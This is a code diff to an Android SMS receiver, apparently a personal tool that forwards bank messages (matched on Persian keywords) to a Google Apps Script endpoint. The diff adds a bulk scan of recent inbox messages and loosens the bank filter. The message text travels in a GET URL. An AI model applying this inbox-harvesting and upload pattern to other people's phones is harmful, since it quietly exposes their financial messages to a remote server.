@@ -4,6 +4,8 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.widget.Toast;
@@ -27,9 +29,11 @@ public class SmsReceiver extends BroadcastReceiver {
             "https://script.google.com/macros/s/AKfycbyLjGFEBZuoF2HxMYHvbJaTEjM8NXf4_6mEUGd4iKE0Fp1xZwIwl3XfY5EhepGlKj72/exec?action=sms&msg=";
 
     private static final String PREF_NAME = "offline_sms_queue";
-    private static final String KEY_QUEUE = "pending_messages_v5";
+    private static final String KEY_QUEUE = "pending_messages_v6";
+    private static final String KEY_SCANNED = "scanned_inbox_ids_v1";
 
     private static boolean syncRunning = false;
+    private static boolean scanRunning = false;
 
     static class SmsItem {
         long time;
@@ -43,7 +47,10 @@ public class SmsReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        retryPendingSms(context.getApplicationContext());
+        Context appContext = context.getApplicationContext();
+
+        retryPendingSms(appContext);
+        scanInboxBankSms(appContext, 80);
 
         if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
             return;
@@ -80,15 +87,94 @@ public class SmsReceiver extends BroadcastReceiver {
 
         new Thread(() -> {
             try {
-                savePendingSms(context.getApplicationContext(), msg, finalSmsTime);
-                retryPendingSms(context.getApplicationContext());
+                savePendingSms(appContext, msg, finalSmsTime);
+                retryPendingSms(appContext);
             } finally {
                 pendingResult.finish();
             }
         }).start();
     }
 
-    private boolean isBankSms(String msg) {
+    public static void scanInboxBankSms(Context context, int limit) {
+        if (context == null) return;
+        if (scanRunning) return;
+
+        scanRunning = true;
+
+        new Thread(() -> {
+            Cursor cursor = null;
+
+            try {
+                Context appContext = context.getApplicationContext();
+                SharedPreferences prefs = appContext.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
+
+                JSONArray scannedArr = new JSONArray(prefs.getString(KEY_SCANNED, "[]"));
+                List<String> scannedIds = new ArrayList<>();
+
+                for (int i = 0; i < scannedArr.length(); i++) {
+                    scannedIds.add(scannedArr.optString(i, ""));
+                }
+
+                Uri uri = Uri.parse("content://sms/inbox");
+
+                cursor = appContext.getContentResolver().query(
+                        uri,
+                        new String[]{"_id", "body", "date"},
+                        null,
+                        null,
+                        "date DESC"
+                );
+
+                if (cursor == null) return;
+
+                int count = 0;
+
+                while (cursor.moveToNext() && count < limit) {
+                    count++;
+
+                    String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
+                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
+
+                    if (id == null || body == null) continue;
+
+                    if (scannedIds.contains(id)) continue;
+
+                    if (isBankSms(body)) {
+                        savePendingSms(appContext, body, date);
+                    }
+
+                    scannedIds.add(id);
+                }
+
+                while (scannedIds.size() > 300) {
+                    scannedIds.remove(0);
+                }
+
+                JSONArray newArr = new JSONArray();
+                for (String id : scannedIds) {
+                    if (id != null && id.length() > 0) {
+                        newArr.put(id);
+                    }
+                }
+
+                prefs.edit().putString(KEY_SCANNED, newArr.toString()).apply();
+
+                retryPendingSms(appContext);
+
+            } catch (Exception ignored) {
+
+            } finally {
+                try {
+                    if (cursor != null) cursor.close();
+                } catch (Exception ignored) {}
+
+                scanRunning = false;
+            }
+        }).start();
+    }
+
+    public static boolean isBankSms(String msg) {
         if (msg == null) return false;
 
         String text = normalize(msg);
@@ -99,10 +185,7 @@ public class SmsReceiver extends BroadcastReceiver {
                 text.contains("حساب") ||
                 text.contains("کارت");
 
-        boolean hasTime =
-                text.matches("(?s).*\\d{1,2}:\\d{2}.*");
-
-        return hasBalance && hasAccountOrCard && hasTime;
+        return hasBalance && hasAccountOrCard;
     }
 
     private static String normalize(String msg) {
@@ -144,8 +227,8 @@ public class SmsReceiver extends BroadcastReceiver {
 
             conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("GET");
-            conn.setConnectTimeout(20000);
-            conn.setReadTimeout(20000);
+            conn.setConnectTimeout(25000);
+            conn.setReadTimeout(25000);
             conn.setUseCaches(false);
 
             int code = conn.getResponseCode();
@@ -155,6 +238,7 @@ public class SmsReceiver extends BroadcastReceiver {
 
             StringBuilder response = new StringBuilder();
             String line;
+
             while ((line = br.readLine()) != null) {
                 response.append(line);
             }
@@ -177,12 +261,7 @@ public class SmsReceiver extends BroadcastReceiver {
         if (msg == null || msg.trim().length() == 0) return;
 
         List<SmsItem> queue = getQueue(context);
-
-        // مهم: اینجا دیگر تکراری را رد نمی‌کنیم
-        // همه پیامک‌ها ذخیره و ارسال می‌شوند
-        // فقط Code.gs تصمیم می‌گیرد تکراری است یا نه
         queue.add(new SmsItem(time, msg));
-
         saveQueue(context, queue);
     }
 
@@ -250,7 +329,6 @@ public class SmsReceiver extends BroadcastReceiver {
                 long time = obj.optLong("time", System.currentTimeMillis());
 
                 if (msg != null && msg.trim().length() > 0) {
-                    // مهم: اینجا هم تکراری حذف نمی‌شود
                     list.add(new SmsItem(time, msg));
                 }
             }
@@ -280,6 +358,7 @@ public class SmsReceiver extends BroadcastReceiver {
     }
 
     public static int getPendingSmsCount(Context context) {
+        if (context == null) return 0;
         return getQueue(context.getApplicationContext()).size();
     }
 }
